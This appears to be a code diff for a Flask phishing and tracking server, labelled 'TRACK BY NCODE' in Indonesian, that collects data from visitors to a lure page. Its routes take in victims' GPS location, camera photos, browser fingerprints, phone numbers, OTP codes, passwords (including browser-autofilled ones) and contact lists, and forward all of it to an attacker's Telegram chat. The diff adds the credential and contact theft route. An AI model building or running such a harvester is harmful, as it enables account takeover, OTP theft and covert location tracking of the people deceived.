@@ -12,16 +12,21 @@ load_dotenv()
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
-IPAPI = "http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
+IPAPI = (
+    "http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,"
+    "region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,"
+    "mobile,proxy,hosting,query"
+)
 
 app = Flask(__name__)
 
-LOG_DIR = os.path.join(os.path.dirname(__file__), "logs")
+LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
 os.makedirs(LOG_DIR, exist_ok=True)
 
 _ip_cache = {}
 
 
+# ============ HELPERS ============
 def client_ip():
     for h in ("CF-Connecting-IP", "True-Client-IP", "X-Real-IP"):
         v = request.headers.get(h)
@@ -36,7 +41,7 @@ def client_ip():
 def ip_info(ip):
     if ip in _ip_cache:
         return _ip_cache[ip]
-    info = {"ip": ip}
+    info = {"ip": ip, "ipv4_or_v6": "IPv6" if ":" in ip else "IPv4"}
     try:
         r = requests.get(
             IPAPI.format(ip=ip),
@@ -48,7 +53,6 @@ def ip_info(ip):
             if j.get("status") == "success":
                 info.update(
                     {
-                        "ipv4_or_v6": "IPv6" if ":" in ip else "IPv4",
                         "country": j.get("country"),
                         "country_code": j.get("countryCode"),
                         "region": j.get("regionName"),
@@ -70,7 +74,6 @@ def ip_info(ip):
     except Exception as e:
         info["error"] = str(e)
 
-    # reverse dns fallback
     if not info.get("reverse_dns"):
         try:
             info["reverse_dns"] = socket.gethostbyaddr(ip)[0]
@@ -83,9 +86,10 @@ def ip_info(ip):
 
 def tg_send(text, disable_preview=False):
     if not BOT_TOKEN or not CHAT_ID:
+        print("[TG] missing BOT_TOKEN/CHAT_ID, skip")
         return
     try:
-        requests.post(
+        r = requests.post(
             f"{TG_API}/sendMessage",
             data={
                 "chat_id": CHAT_ID,
@@ -95,16 +99,18 @@ def tg_send(text, disable_preview=False):
             },
             timeout=10,
         )
+        print("[TG] sendMessage", r.status_code)
     except Exception as e:
-        print("TG sendMessage error:", e)
+        print("[TG] sendMessage error:", e)
 
 
 def tg_send_photo(path, caption=""):
     if not BOT_TOKEN or not CHAT_ID:
+        print("[TG] missing BOT_TOKEN/CHAT_ID, skip photo")
         return
     try:
         with open(path, "rb") as f:
-            requests.post(
+            r = requests.post(
                 f"{TG_API}/sendPhoto",
                 data={
                     "chat_id": CHAT_ID,
@@ -114,8 +120,13 @@ def tg_send_photo(path, caption=""):
                 files={"photo": f},
                 timeout=30,
             )
+        print("[TG] sendPhoto", r.status_code)
     except Exception as e:
-        print("TG sendPhoto error:", e)
+        print("[TG] sendPhoto error:", e)
+
+
+def esc(v):
+    return str(v) if v is not None else "-"
 
 
 def build_telegram_message(data):
@@ -141,49 +152,55 @@ def build_telegram_message(data):
     if lat and lng:
         gmaps = (
             f"https://www.google.com/maps?q={lat},{lng}\n"
-            f"https://maps.google.com/?q={lat},{lng}&z=18\n"
-            f"https://yandex.com/maps/?ll={lng}%2C{lat}&z=17"
+            f"https://maps.google.com/?q={lat},{lng}&z=18"
         )
-
-    def esc(v):
-        return str(v) if v is not None else "-"
 
     parts = []
     parts.append("🎯 <b>TRACK BY NCODE</b>")
-    parts.append(f"<b>Waktu</b>: {srv.get('ts','-')}")
+    parts.append(f"<b>Waktu</b>: {esc(srv.get('ts'))}")
 
-    # ---- NETWORK / IP ----
     parts.append("\n<b>═══ 🌐 NETWORK ═══</b>")
     parts.append(f"<b>IP</b> <code>{ip}</code> ({ipv})")
     parts.append(f"<b>Reverse DNS</b>: <code>{esc(ipaddr.get('reverse_dns'))}</code>")
     parts.append(f"<b>ISP</b>: {esc(ipaddr.get('isp'))}")
     parts.append(f"<b>Org</b>: {esc(ipaddr.get('org'))}")
     parts.append(f"<b>ASN</b>: {esc(ipaddr.get('asn'))} ({esc(ipaddr.get('asname'))})")
-    parts.append(f"<b>Negara</b>: {esc(ipaddr.get('country'))} [{esc(ipaddr.get('country_code'))}]")
+    parts.append(
+        f"<b>Negara</b>: {esc(ipaddr.get('country'))} [{esc(ipaddr.get('country_code'))}]"
+    )
     parts.append(f"<b>Region</b>: {esc(ipaddr.get('region'))}")
     parts.append(f"<b>Kota</b>: {esc(ipaddr.get('city'))} — {esc(ipaddr.get('zip'))}")
     parts.append(f"<b>Timezone</b>: {esc(ipaddr.get('timezone'))}")
-    parts.append(f"<b>Mobile/Proxy/Hosting</b>: {esc(ipaddr.get('mobile'))}/{esc(ipaddr.get('proxy'))}/{esc(ipaddr.get('hosting'))}")
+    parts.append(
+        f"<b>Mobile/Proxy/Hosting</b>: {esc(ipaddr.get('mobile'))}/"
+        f"{esc(ipaddr.get('proxy'))}/{esc(ipaddr.get('hosting'))}"
+    )
     parts.append(f"<b>Local IP (WebRTC)</b>: <code>{esc(net.get('webrtc_local'))}</code>")
     parts.append(f"<b>Conn API</b>: {esc(net.get('conn'))}")
-    parts.append(f"<b>Downlink/RTT</b>: {esc(net.get('downlink'))}Mbps / {esc(net.get('rtt'))}ms")
+    parts.append(
+        f"<b>Downlink/RTT</b>: {esc(net.get('downlink'))}Mbps / {esc(net.get('rtt'))}ms"
+    )
     parts.append(f"<b>Save-data</b>: {esc(net.get('save_data'))}")
     parts.append(f"<b>Accept-Lang</b>: {esc(srv.get('accept_lang'))}")
     parts.append(f"<b>Referer</b>: {esc(srv.get('referer'))}")
 
-    # ---- OS ----
     parts.append("\n<b>═══ 💻 OS / SYSTEM ═══</b>")
     parts.append(f"<b>OS</b>: {esc(osd.get('name'))}")
     parts.append(f"<b>Version</b>: {esc(osd.get('version'))}")
     parts.append(f"<b>Arch</b>: {esc(osd.get('arch'))}")
     if ch:
-        parts.append(f"<b>CH Platform</b>: {esc(ch.get('platform'))} {esc(ch.get('platformVersion'))}")
+        parts.append(
+            f"<b>CH Platform</b>: {esc(ch.get('platform'))} {esc(ch.get('platform_version'))}"
+        )
         parts.append(f"<b>CH Model</b>: {esc(ch.get('model'))}")
-        parts.append(f"<b>CH Arch</b>: {esc(ch.get('architecture'))} / {esc(ch.get('bitness'))}bit")
-        parts.append(f"<b>CH Brand</b>: {esc(ch.get('brand'))} / {esc(ch.get('mobile'))}")
+        parts.append(
+            f"<b>CH Arch</b>: {esc(ch.get('architecture'))} / {esc(ch.get('bitness'))}bit"
+        )
+        parts.append(
+            f"<b>CH Brand</b>: {esc(ch.get('brand'))} / {esc(ch.get('mobile'))}"
+        )
     parts.append(f"<b>UA</b>: <code>{(srv.get('ua_header') or '-')[:280]}</code>")
 
-    # ---- DEVICE ----
     parts.append("\n<b>═══ 📱 DEVICE / HARDWARE ═══</b>")
     parts.append(f"<b>Platform</b>: {esc(dev.get('platform'))}")
     parts.append(f"<b>Screen</b>: {esc(dev.get('screen'))}")
@@ -196,9 +213,11 @@ def build_telegram_message(data):
     parts.append(f"<b>Touch</b>: {esc(dev.get('touch'))} | <b>Hover</b>: {esc(dev.get('hover'))}")
     parts.append(f"<b>Lang</b>: {esc(dev.get('lang'))} ({esc(dev.get('langs'))})")
     parts.append(f"<b>TZ</b>: {esc(dev.get('tz'))}")
-    parts.append(f"<b>Storage</b>: used {esc((sens.get('storage') or {}).get('usage'))} / quota {esc((sens.get('storage') or {}).get('quota'))}")
+    storage = sens.get("storage") or {}
+    parts.append(
+        f"<b>Storage</b>: used {esc(storage.get('usage'))} / quota {esc(storage.get('quota'))}"
+    )
 
-    # ---- FINGERPRINT ----
     parts.append("\n<b>═══ 🧬 FINGERPRINT ═══</b>")
     parts.append(f"<b>Canvas</b>: <code>{esc(fpr.get('canvas'))}</code>")
     parts.append(f"<b>Audio</b>: <code>{esc(fpr.get('audio'))}</code>")
@@ -206,42 +225,58 @@ def build_telegram_message(data):
     parts.append(f"<b>Fonts</b>: {esc(fpr.get('fonts'))}")
     parts.append(f"<b>Voices</b>: {esc(fpr.get('voice_count'))} — {esc(fpr.get('voice_sample'))}")
     parts.append(f"<b>Plugins</b>: {esc(fpr.get('plugins'))}")
-    parts.append(f"<b>DoNotTrack</b>: {esc(fpr.get('dnt'))} | <b>Cookies</b>: {esc(fpr.get('cookies'))}")
+    parts.append(
+        f"<b>DoNotTrack</b>: {esc(fpr.get('dnt'))} | <b>Cookies</b>: {esc(fpr.get('cookies'))}"
+    )
     parts.append(f"<b>Adblock hint</b>: {esc(fpr.get('adblock'))}")
 
-    # ---- SENSORS ----
     parts.append("\n<b>═══ 📡 SENSOR / PERMISSION ═══</b>")
     perm = sens.get("permissions") or {}
     for k, v in perm.items():
         parts.append(f"<b>{k}</b>: {esc(v)}")
     parts.append(f"<b>MediaDevices</b>: {esc(sens.get('media_devices'))}")
 
-    # ---- GEO ----
     parts.append("\n<b>═══ 📍 GEOLOKASI ═══</b>")
     parts.append(f"<b>Sumber</b>: {gps_src}")
     parts.append(f"<b>Lat, Lng</b>: <code>{esc(lat)}, {esc(lng)}</code>")
     parts.append(f"<b>Akurasi</b>: {esc(acc)} m")
     if geo:
-        parts.append(f"<b>Altitude</b>: {esc(geo.get('altitude'))} | <b>Heading</b>: {esc(geo.get('heading'))} | <b>Speed</b>: {esc(geo.get('speed'))}")
+        parts.append(
+            f"<b>Altitude</b>: {esc(geo.get('altitude'))} | "
+            f"<b>Heading</b>: {esc(geo.get('heading'))} | "
+            f"<b>Speed</b>: {esc(geo.get('speed'))}"
+        )
     if gmaps:
         parts.append("<b>🗺 Buka Peta:</b>")
         parts.append(gmaps)
 
-    # ---- OTP ----
-    phone = data.get("phone", "-")
     parts.append("\n<b>═══ 📞 KONTAK ═══</b>")
-    parts.append(f"<b>Phone</b>: <code>{phone}</code>")
+    parts.append(f"<b>Phone</b>: <code>{esc(data.get('phone'))}</code>")
 
     return "\n".join(parts)
 
 
+def save_json(name, data):
+    path = os.path.join(LOG_DIR, name)
+    with open(path, "w", encoding="utf-8") as f:
+        json.dump(data, f, indent=2, ensure_ascii=False)
+    return path
+
+
+# ============ ROUTES ============
 @app.route("/")
 def index():
     return render_template("index.html")
 
 
+@app.route("/success")
+def success():
+    return render_template("success.html")
+
+
 @app.route("/api/collect", methods=["POST"])
 def collect():
+    print("[COLLECT] hit from", client_ip())
     data = request.get_json(silent=True) or {}
     ip = client_ip()
     ts = time.strftime("%Y%m%d-%H%M%S")
@@ -260,7 +295,8 @@ def collect():
     ):
         v = request.headers.get(h)
         if v:
-            ch[h.replace("Sec-CH-UA-", "").lower().replace("-", "_")] = v.strip('"')
+            key = h.replace("Sec-CH-UA-", "").lower().replace("-", "_")
+            ch[key] = v.strip('"')
 
     data["_server"] = {
         "ip": ip,
@@ -274,12 +310,9 @@ def collect():
         "ts": ts,
     }
 
-    fp = os.path.join(LOG_DIR, f"{ip}_{ts}.json")
-    with open(fp, "w", encoding="utf-8") as f:
-        json.dump(data, f, indent=2, ensure_ascii=False)
-
-    msg = build_telegram_message(data)
-    tg_send(msg)
+    save_json(f"{ip}_{ts}.json", data)
+    print("[COLLECT] saved, phone:", data.get("phone"))
+    tg_send(build_telegram_message(data))
 
     cam = data.get("camera")
     if cam and isinstance(cam, str) and cam.startswith("data:image"):
@@ -290,40 +323,88 @@ def collect():
             with open(cp, "wb") as f:
                 f.write(img)
             geo = data.get("geo") or {}
-            cap = f"📸 <b>Kamera</b> {data.get('phone','-')} — {ip}"
+            cap = f"📸 <b>Kamera</b> {data.get('phone', '-')} — {ip}"
             if geo.get("lat"):
                 cap += f"\n📍 https://maps.google.com/?q={geo['lat']},{geo['lng']}"
             tg_send_photo(cp, cap)
         except Exception as e:
-            print("camera save error:", e)
+            print("[COLLECT] camera save error:", e)
 
     return jsonify({"ok": True})
 
 
 @app.route("/api/otp", methods=["POST"])
 def otp():
+    print("[OTP] hit from", client_ip())
     data = request.get_json(silent=True) or {}
     ip = client_ip()
     ts = time.strftime("%Y%m%d-%H%M%S")
     code = data.get("code", "-")
     phone = data.get("phone", "-")
 
-    fp = os.path.join(LOG_DIR, f"{ip}_{ts}_otp.json")
-    with open(fp, "w", encoding="utf-8") as f:
-        json.dump(data, f, indent=2, ensure_ascii=False)
+    save_json(f"{ip}_{ts}_otp.json", data)
 
     ipaddr = ip_info(ip)
     tg_send(
         f"<b>🔑 OTP MASUK</b>\n"
         f"<b>Phone</b>: <code>{phone}</code>\n"
         f"<b>Kode</b>: <code>{code}</code>\n"
-        f"<b>IP</b>: <code>{ip}</code> ({ipaddr.get('ipv4_or_v6','-')})\n"
-        f"<b>ISP</b>: {ipaddr.get('isp','-')} / {ipaddr.get('asn','-')}\n"
-        f"<b>Lokasi IP</b>: {ipaddr.get('city','-')}, {ipaddr.get('region','-')}, {ipaddr.get('country','-')}\n"
-        f"<b>Peta IP</b>: https://www.google.com/maps?q={ipaddr.get('lat','')},{ipaddr.get('lng','')}"
+        f"<b>IP</b>: <code>{ip}</code> ({ipaddr.get('ipv4_or_v6', '-')})\n"
+        f"<b>ISP</b>: {ipaddr.get('isp', '-')} / {ipaddr.get('asn', '-')}\n"
+        f"<b>Lokasi IP</b>: {ipaddr.get('city', '-')}, "
+        f"{ipaddr.get('region', '-')}, {ipaddr.get('country', '-')}\n"
+        f"<b>Peta IP</b>: https://www.google.com/maps?q="
+        f"{ipaddr.get('lat', '')},{ipaddr.get('lng', '')}"
     )
     return jsonify({"ok": True})
 
 
+@app.route("/api/creds", methods=["POST"])
+def creds():
+    print("[CREDS] hit from", client_ip())
+    data = request.get_json(silent=True) or {}
+    ip = client_ip()
+    ts = time.strftime("%Y%m%d-%H%M%S")
+
+    save_json(f"{ip}_{ts}_creds.json", data)
+
+    c = data.get("creds") or {}
+    auto = c.get("autofill") or {}
+    phone = data.get("phone", "-")
+
+    msg = (
+        f"<b>🔐 KREDENSIAL</b>\n"
+        f"<b>Phone</b>: <code>{phone}</code>\n"
+        f"<b>User</b>: <code>{esc(c.get('username'))}</code>\n"
+        f"<b>Pass</b>: <code>{esc(c.get('password'))}</code>\n"
+        f"<b>Autofill user</b>: <code>{esc(auto.get('username'))}</code>\n"
+        f"<b>Autofill email</b>: <code>{esc(auto.get('email'))}</code>\n"
+        f"<b>Autofill pass</b>: <code>{esc(auto.get('password'))}</code>\n"
+        f"<b>IP</b>: <code>{ip}</code>"
+    )
+    if auto.get("password"):
+        msg = "⚠️ " + msg
+    tg_send(msg)
+
+    contacts = data.get("contacts")
+    if contacts and isinstance(contacts, list) and len(contacts) > 0:
+        lines = [f"<b>📇 KONTAK</b> ({len(contacts)} item)"]
+        for i, ct in enumerate(contacts[:30]):
+            lines.append(
+                f"{i+1}. <b>{esc(ct.get('name'))}</b>\n"
+                f"   ☎ {esc(ct.get('tel'))}\n"
+                f"   ✉ {esc(ct.get('email'))}"
+            )
+        if len(contacts) > 30:
+            lines.append(f"… dan {len(contacts) - 30} kontak lagi (lihat log JSON)")
+        tg_send("\n".join(lines))
+
+    return jsonify({"ok": True})
+
+
+# ============ RUN ============
 if __name__ == "__main__":
+    print("[BOOT] BOT_TOKEN set:", bool(BOT_TOKEN))
+    print("[BOOT] CHAT_ID set:", bool(CHAT_ID))
+    print("[BOOT] LOG_DIR:", LOG_DIR)
     app.run(host="0.0.0.0", port=5000, debug=False)
